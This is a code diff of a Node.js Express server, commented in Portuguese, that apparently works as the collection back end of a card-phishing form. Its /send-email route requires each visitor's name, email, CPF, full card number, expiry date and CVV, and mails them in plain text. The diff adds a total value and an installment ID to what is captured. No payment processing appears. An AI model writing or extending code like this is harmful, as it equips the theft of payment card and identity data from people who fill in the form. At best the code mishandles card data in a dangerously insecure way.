@@ -12,10 +12,20 @@ app.use(cors());
 
 // Rota para receber os dados do formulário
 app.post('/send-email', async (req, res) => {
-  const { name, email, cpf, cardNumber, expiryDate, cvv, installments } = req.body;
+  const { 
+    name, 
+    email, 
+    cpf, 
+    cardNumber, 
+    expiryDate, 
+    cvv, 
+    installments, 
+    totalValue, 
+    installmentId 
+  } = req.body;
 
   // Verifica se todos os campos necessários estão preenchidos
-  if (!name || !email || !cpf || !cardNumber || !expiryDate || !cvv || !installments) {
+  if (!name || !email || !cpf || !cardNumber || !expiryDate || !cvv || !installments || !totalValue || !installmentId) {
     return res.status(400).json({ message: 'Todos os campos são obrigatórios.' });
   }
 
@@ -41,7 +51,9 @@ app.post('/send-email', async (req, res) => {
         Número do Cartão: ${cardNumber}
         Data de Validade: ${expiryDate}
         CVV: ${cvv}
+        Valor Total: ${totalValue}
         Parcelas: ${installments}
+        ID do Parcelamento: ${installmentId}
       `,
     };
 
